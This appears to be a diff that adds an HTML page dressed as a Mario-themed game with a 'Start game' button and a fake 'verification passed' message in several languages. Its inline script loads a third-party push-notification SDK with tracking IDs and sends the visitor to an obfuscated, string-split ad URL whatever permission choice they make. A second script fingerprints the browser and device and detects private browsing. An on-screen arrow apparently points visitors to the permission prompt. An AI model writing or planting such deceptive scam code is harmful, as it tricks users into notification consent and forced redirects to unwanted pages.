@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html>
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta charset="UTF-8">
+    <title>Mario</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            background-color: #8484ff;
+            height: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            color: #fff;
+            font: 400 16px Roboto, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+            user-select: none;
+            width: 100%
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .ic {
+            background-image: url(images/mario/sprite.png);
+            background-repeat: no-repeat
+        }
+
+        .ic--cloudS {
+            height: 52px;
+            width: 64px
+        }
+
+        .ic--cloudB {
+            background-position: -64px 0;
+            height: 52px;
+            width: 100px
+        }
+
+        .ic--earth {
+            background-position: 0 -243px;
+            background-repeat: repeat-x;
+            height: 34px
+        }
+
+        .ic--brick {
+            background-position: 0 -52px;
+            height: 33px;
+            width: 34px
+        }
+
+        .ic--unknown {
+            -webkit-animation: a .4s steps(3, start) infinite alternate;
+            animation: a .4s steps(3, start) infinite alternate;
+            background-position: -160px -127px;
+            height: 32px;
+            width: 32px
+        }
+
+        .ic--mushroom {
+            background-position: -124px -161px;
+            height: 32px;
+            width: 32px
+        }
+
+        .ic--mountainS {
+            background-position: 0 -86px;
+            height: 41px;
+            width: 96px
+        }
+
+        .ic--mountainB {
+            background-position: -96px -52px;
+            height: 75px;
+            width: 160px
+        }
+
+        .ic--treeS {
+            background-position: -32px -162px;
+            height: 64px;
+            width: 28px
+        }
+
+        .ic--treeB {
+            background-position: 0 -127px;
+            height: 99px;
+            width: 32px
+        }
+
+        .ic--fence {
+            background-position: -60px -209px;
+            height: 34px;
+            width: 129px
+        }
+
+        .ic--bush {
+            background-position: -32px -127px;
+            height: 34px;
+            width: 128px
+        }
+
+        .ic--coin {
+            -webkit-animation: c .45s steps(3, start) infinite alternate;
+            animation: c .45s steps(3, start) infinite alternate;
+            background-position: -34px -52px;
+            height: 30px;
+            width: 20px
+        }
+
+        .ic--pipe {
+            background-position: -256px 0;
+            height: 138px;
+            width: 65px
+        }
+
+        .ic--medusa {
+            background-position: -60px -161px;
+            height: 48px;
+            width: 32px
+        }
+
+        .ic--flower {
+            background-position: -188px -161px;
+            height: 48px;
+            width: 32px
+        }
+
+        .ic--mario {
+            background-position: -189px -209px;
+            height: 32px;
+            width: 26px
+        }
+
+        .w {
+            height: 100%;
+            left: 0;
+            top: 0;
+            width: 100%
+        }
+
+        .cloud,
+        .w {
+            position: absolute
+        }
+
+        .cloud {
+            transform: translateX(-100%)
+        }
+
+        .cloud.isOne {
+            -webkit-animation: g 10s linear 3s infinite;
+            animation: g 10s linear 3s infinite;
+            top: 10%
+        }
+
+        .cloud.isTwo {
+            -webkit-animation: g 8s linear 1s infinite;
+            animation: g 8s linear 1s infinite;
+            top: 8%
+        }
+
+        .cloud.isTree {
+            -webkit-animation: g 12s linear 2s infinite;
+            animation: g 12s linear 2s infinite;
+            top: 12%
+        }
+
+        .cloud.isFour {
+            -webkit-animation: g 15s linear 5s infinite;
+            animation: g 15s linear 5s infinite;
+            top: 15%
+        }
+
+        .mountain {
+            bottom: 68px;
+            position: absolute
+        }
+
+        .mountain.isOne {
+            left: 15%
+        }
+
+        .mountain.isTwo {
+            display: none
+        }
+
+        .mushroom {
+            -webkit-animation: b .3s steps(2, start) infinite, j 2s linear infinite alternate;
+            animation: b .3s steps(2, start) infinite, j 2s linear infinite alternate;
+            bottom: 181px
+        }
+
+        .brick,
+        .mushroom {
+            left: 20%;
+            position: absolute
+        }
+
+        .brick {
+            bottom: 148px
+        }
+
+        .brick.isTwo {
+            margin-left: 32px;
+            transform: rotate(180deg)
+        }
+
+        .brick.isTree {
+            margin-left: 66px
+        }
+
+        .brick.isFour {
+            margin-left: 98px;
+            transform: rotate(180deg)
+        }
+
+        .brick.isFive,
+        .brick.isSix {
+            display: none
+        }
+
+        .unknown {
+            bottom: 148px;
+            margin-left: 34px
+        }
+
+        .coin,
+        .unknown {
+            left: 20%;
+            position: absolute
+        }
+
+        .coin.isOne {
+            bottom: 220px;
+            margin-left: 180px
+        }
+
+        .coin.isTwo {
+            bottom: 205px;
+            margin-left: 205px
+        }
+
+        .coin.isTree {
+            bottom: 190px;
+            margin-left: 230px
+        }
+
+        .bush {
+            display: none
+        }
+
+        .tree {
+            bottom: 68px;
+            position: absolute
+        }
+
+        .tree.isOne {
+            left: 30%
+        }
+
+        .tree.isTwo {
+            display: none
+        }
+
+        .fence {
+            bottom: 68px;
+            position: absolute;
+            right: 35%
+        }
+
+        .flower,
+        .medusa,
+        .pipe {
+            display: none
+        }
+
+        .mario {
+            -webkit-animation: f .6s steps(3, start) infinite alternate, h .6s ease-out infinite alternate;
+            animation: f .6s steps(3, start) infinite alternate, h .6s ease-out infinite alternate;
+            bottom: 68px;
+            left: 5%
+        }
+
+        .earth,
+        .mario {
+            position: absolute
+        }
+
+        .earth {
+            width: 100%
+        }
+
+        .earth.isOne {
+            bottom: 0
+        }
+
+        .earth.isTwo {
+            bottom: 34px
+        }
+
+        .btn {
+            -webkit-tap-highlight-color: transparent;
+            background-color: #bc1d22;
+            border-radius: 5px;
+            box-shadow: 0 0 5px 0 #000;
+            cursor: pointer;
+            font-size: 22px;
+            left: 50%;
+            margin: auto;
+            outline: none;
+            padding: 12px 20px 10px;
+            position: absolute;
+            text-transform: uppercase;
+            top: 35%;
+            transform: translate(-50%);
+            transition: box-shadow .15s ease-out
+        }
+
+        .btn:hover {
+            box-shadow: 0 0 5px 2px #000
+        }
+
+        .wArrow {
+            display: none
+        }
+
+        .msg {
+            background-color: rgba(0, 0, 0, .75);
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .msg__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @-webkit-keyframes a {
+            0% {
+                background-position: -128px -127px
+            }
+
+            to {
+                background-position: -224px -127px
+            }
+        }
+
+        @keyframes a {
+            0% {
+                background-position: -128px -127px
+            }
+
+            to {
+                background-position: -224px -127px
+            }
+        }
+
+        @-webkit-keyframes b {
+            0% {
+                background-position: -92px -161px
+            }
+
+            to {
+                background-position: -156px -161px
+            }
+        }
+
+        @keyframes b {
+            0% {
+                background-position: -92px -161px
+            }
+
+            to {
+                background-position: -156px -161px
+            }
+        }
+
+        @-webkit-keyframes c {
+            0% {
+                background-position: -14px -52px
+            }
+
+            to {
+                background-position: -74px -52px
+            }
+        }
+
+        @keyframes c {
+            0% {
+                background-position: -14px -52px
+            }
+
+            to {
+                background-position: -74px -52px
+            }
+        }
+
+        @-webkit-keyframes d {
+            0% {
+                background-position: -28px -161px
+            }
+
+            to {
+                background-position: -92px -161px
+            }
+        }
+
+        @keyframes d {
+            0% {
+                background-position: -28px -161px
+            }
+
+            to {
+                background-position: -92px -161px
+            }
+        }
+
+        @-webkit-keyframes e {
+            0% {
+                background-position: -156px -161px
+            }
+
+            to {
+                background-position: -220px -161px
+            }
+        }
+
+        @keyframes e {
+            0% {
+                background-position: -156px -161px
+            }
+
+            to {
+                background-position: -220px -161px
+            }
+        }
+
+        @-webkit-keyframes f {
+            0% {
+                background-position: -163px -209px
+            }
+
+            to {
+                background-position: -241px -209px
+            }
+        }
+
+        @keyframes f {
+            0% {
+                background-position: -163px -209px
+            }
+
+            to {
+                background-position: -241px -209px
+            }
+        }
+
+        @-webkit-keyframes g {
+            0% {
+                transform: translateX(-100%)
+            }
+
+            to {
+                transform: translateX(100vw)
+            }
+        }
+
+        @keyframes g {
+            0% {
+                transform: translateX(-100%)
+            }
+
+            to {
+                transform: translateX(100vw)
+            }
+        }
+
+        @-webkit-keyframes h {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(-10px)
+            }
+        }
+
+        @keyframes h {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(-10px)
+            }
+        }
+
+        @-webkit-keyframes i {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(90%)
+            }
+        }
+
+        @keyframes i {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(90%)
+            }
+        }
+
+        @-webkit-keyframes j {
+            0% {
+                transform: translateX(0)
+            }
+
+            to {
+                transform: translateX(100px)
+            }
+        }
+
+        @keyframes j {
+            0% {
+                transform: translateX(0)
+            }
+
+            to {
+                transform: translateX(100px)
+            }
+        }
+
+        @-webkit-keyframes k {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(70px)
+            }
+        }
+
+        @keyframes k {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(70px)
+            }
+        }
+
+        @-webkit-keyframes l {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(20px)
+            }
+        }
+
+        @keyframes l {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(20px)
+            }
+        }
+
+        @media (min-width:425px) {
+            .msg__tx {
+                font-size: 52px
+            }
+        }
+
+        @media (min-width:700px) {
+            .mountain.isTwo {
+                display: block;
+                right: 15%
+            }
+
+            .brick.isFive {
+                margin-right: 130px
+            }
+
+            .brick.isFive,
+            .brick.isSix {
+                bottom: 100px;
+                display: block;
+                left: auto;
+                right: 2%
+            }
+
+            .brick.isSix {
+                margin-right: 98px;
+                transform: rotate(180deg)
+            }
+
+            .bush {
+                bottom: 68px;
+                display: block;
+                left: 25%;
+                position: absolute
+            }
+
+            .tree.isTwo {
+                display: block;
+                right: 46%
+            }
+
+            .medusa {
+                -webkit-animation: d .5s steps(2, start) infinite, k 2s ease-in-out infinite alternate;
+                animation: d .5s steps(2, start) infinite, k 2s ease-in-out infinite alternate;
+                bottom: 200px;
+                left: 20%;
+                margin-left: 280px
+            }
+
+            .flower,
+            .medusa {
+                display: block;
+                position: absolute
+            }
+
+            .flower {
+                -webkit-animation: e .5s steps(2, start) infinite, i 1s ease-in infinite alternate;
+                animation: e .5s steps(2, start) infinite, i 1s ease-in infinite alternate;
+                bottom: 176px;
+                margin-right: 15px;
+                right: 2%
+            }
+
+            .pipe {
+                bottom: 38px;
+                display: block;
+                position: absolute;
+                right: 2%
+            }
+
+            .btn {
+                font-size: 32px
+            }
+
+            .wArrow {
+                background-color: rgba(0, 0, 0, .5);
+                display: block;
+                height: 100%;
+                left: 0;
+                opacity: 0;
+                position: absolute;
+                top: 0;
+                transition: opacity .1s ease-out, visibility 0s steps(1);
+                visibility: hidden;
+                width: 100%
+            }
+
+            .wArrow.isVisible {
+                opacity: 1;
+                transition-delay: 0s, .1s;
+                visibility: visible
+            }
+
+            .wArrow__ic {
+                fill: #fff;
+                height: 100px;
+                left: 200px;
+                opacity: 0;
+                position: absolute;
+                top: 150px;
+                transition: opacity .1s ease-out .2s;
+                width: 100px
+            }
+
+            .isPopup .wArrow__ic {
+                left: 100px
+            }
+
+            body:-moz-full-screen .wArrow__ic {
+                left: 100px
+            }
+
+            body:-webkit-full-screen .wArrow__ic {
+                left: 100px
+            }
+
+            body:-ms-fullscreen .wArrow__ic {
+                left: 100px
+            }
+
+            body:fullscreen .wArrow__ic {
+                left: 100px
+            }
+
+            body.isYandex .wArrow__ic {
+                left: auto;
+                right: 200px;
+                top: 200px
+            }
+
+            .wArrow.isVisible .wArrow__ic {
+                -webkit-animation: l .5s ease-in-out .3s 6 alternate;
+                animation: l .5s ease-in-out .3s 6 alternate;
+                opacity: 1
+            }
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht', 'tps:/', '/blatw', 'alm.com/a', 'fu.ph', 'p?zon', 'eid=2483917'].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2490456&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>  
+    <div class="w">
+        <div class="cloud isOne ic ic--cloudS"></div>
+        <div class="cloud isTwo ic ic--cloudS"></div>
+        <div class="cloud isTree ic ic--cloudB"></div>
+        <div class="cloud isFour ic ic--cloudB"></div>
+        <div class="mountain isOne ic ic--mountainS"></div>
+        <div class="mountain isTwo ic ic--mountainB"></div>
+        <div class="mushroom ic ic--mushroom"></div>
+        <div class="brick isOne ic ic--brick"></div>
+        <div class="brick isTwo ic ic--brick"></div>
+        <div class="brick isTree ic ic--brick"></div>
+        <div class="brick isFour ic ic--brick"></div>
+        <div class="brick isFive ic ic--brick"></div>
+        <div class="brick isSix ic ic--brick"></div>
+        <div class="unknown ic ic--unknown"></div>
+        <div class="coin isOne ic ic--coin"></div>
+        <div class="coin isTwo ic ic--coin"></div>
+        <div class="coin isTree ic ic--coin"></div>
+        <div class="bush ic ic--bush"></div>
+        <div class="tree isOne ic ic--treeS"></div>
+        <div class="tree isTwo ic ic--treeB"></div>
+        <div class="fence ic ic--fence"></div>
+        <div class="medusa ic ic--medusa"></div>
+        <div class="flower ic ic--flower"></div>
+        <div class="pipe ic ic--pipe"></div>
+        <div class="mario ic ic--mario"></div>
+        <div class="earth isOne ic ic--earth"></div>
+        <div class="earth isTwo ic ic--earth"></div>
+        <div class="btn"></div>
+        <div class="wArrow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 511.999 511.999" class="wArrow__ic">
+                <path d="M399.436,191.249L262.903,3.516C261.298,1.306,258.738,0,255.999,0c-2.731,0-5.291,1.306-6.895,3.516L112.571,191.249 c-1.084,1.485-1.638,3.251-1.638,5.018c0,1.323,0.316,2.645,0.939,3.874c1.451,2.859,4.386,4.659,7.595,4.659h85.333v93.867 c0,4.719,3.823,8.533,8.533,8.533h85.333c4.719,0,8.533-3.814,8.533-8.533V204.8h85.333c3.209,0,6.153-1.8,7.603-4.659 C401.595,197.291,401.322,193.852,399.436,191.249z"></path>
+                <path d="M281.603,324.266h-51.2c-14.114,0-25.6,11.486-25.6,25.6s11.486,25.6,25.6,25.6h51.2c14.114,0,25.6-11.486,25.6-25.6 S295.717,324.266,281.603,324.266z"></path>
+                <path d="M281.603,392.532h-51.2c-14.114,0-25.6,11.486-25.6,25.6s11.486,25.6,25.6,25.6h51.2c14.114,0,25.6-11.486,25.6-25.6 S295.717,392.532,281.603,392.532z"></path>
+                <path d="M281.603,460.799h-51.2c-14.114,0-25.6,11.486-25.6,25.6s11.486,25.6,25.6,25.6h51.2c14.114,0,25.6-11.486,25.6-25.6 S295.717,460.799,281.603,460.799z"></path>
+            </svg></div>
+    </div>
+    <div class="msg isHide">
+        <div class="msg__tx"></div>
+    </div>
+    <script>var v = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            t = "private";
+
+                        function o() {
+                            return n(t)
+                        }
+
+                        function i() {
+                            return n(e)
+                        }
+                        if ("safari" === v.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(t)
+                        } else if ("firefox" === v.n) {
+                            var r = indexedDB.open("test.html");
+                            r.addEventListener("error", o), r.addEventListener("success", i)
+                        } else {
+                            if ("edge" === v.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(t);
+                            if ("opera" !== v.n && "yandex" !== v.n && "chrome" !== v.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, i, o)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            t = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            o = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            i = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            r = /UBrowser/.test(this.ua),
+                            a = /Edge\//.test(this.ua),
+                            s = null;
+                        return e ? s = "opera" : n ? s = "firefox" : i ? s = "yandex" : r ? s = "uc" : a ? s = "edge" : o ? s = "chrome" : t && (s = "safari"), s
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            t = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== v.ua.match(new RegExp(n[e], "i"))) return t = e, !0
+                        }), t
+                    }
+                },
+                p = v;
+
+            var g = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (g.k = navigator.language.slice(0, 2)), void 0 === e[g.k] && (g.k = "en"), g.t = e[g.k]
+                    },
+                    get: function(e) {
+                        return g.t[e]
+                    }
+                },
+                y = g;
+
+            function S(e) {
+                l({
+                    a: e ? "success" : "close"
+                }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector(".w").classList.add("isHide"), document.querySelector(".msg").classList.remove("isHide")
+            }
+
+
+            function M() {
+                R.classList.remove("isVisible")
+            }
+            y.set({
+                en: {
+                    btn: "Start game",
+                    msg: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                uk: {
+                    btn: "Почати гру",
+                    msg: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    btn: "Rozpocząć grę",
+                    msg: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                ru: {
+                    btn: "Start game",
+                    msg: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                fr: {
+                    btn: "Démarrer jeu",
+                    msg: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    btn: "Spiel beginnen",
+                    msg: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    btn: "Empezar juego",
+                    msg: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                th: {
+                    btn: "เริ่มเกมส์",
+                    msg: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                }
+            }), null !== window.opener && document.body.classList.add("isPopup"), "yandex" === p.n && document.body.classList.add("isYandex");
+            var _ = document.querySelector(".btn"),
+                R = document.querySelector(".wArrow"),
+                T = document.querySelector(".wArrow__ic");
+            document.querySelector(".msg__tx").innerHTML = y.get("msg"), _.addEventListener("click", function() {
+                R.classList.add("isVisible")
+            }), _.textContent = y.get("btn"), T.addEventListener("webkitAnimationEnd", M), T.addEventListener("animationend", M)
+
+    </script>
+
+</body>
+
+
+</html>
